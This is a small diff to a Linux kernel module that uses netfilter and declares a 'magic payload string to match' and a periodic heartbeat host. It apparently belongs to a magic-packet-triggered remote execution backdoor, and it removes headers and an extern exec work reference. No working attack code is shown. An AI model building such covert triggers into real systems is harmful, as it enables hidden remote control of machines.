@@ -4,8 +4,6 @@
  *
  * Copyright (c) 2023, 03C0 (https://03c0.net/)
  */
-#include <linux/kernel.h>
-#include <linux/module.h>
 #include <linux/netdevice.h>
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
@@ -30,9 +28,6 @@ static char *match_payload = NULL;   // Magic payload string to match
 static char *heartbeat_host = NULL;  // Host to ping periodically (string IP)
 static unsigned int heartbeat_interval = 10; // seconds
 static unsigned int heartbeat_timeout   = 30; // seconds
-
-/* External exec work from main module */
-extern struct work_struct exec_work;
 
 /* Parsed forms */
 static u8 mac_bytes[ETH_ALEN];
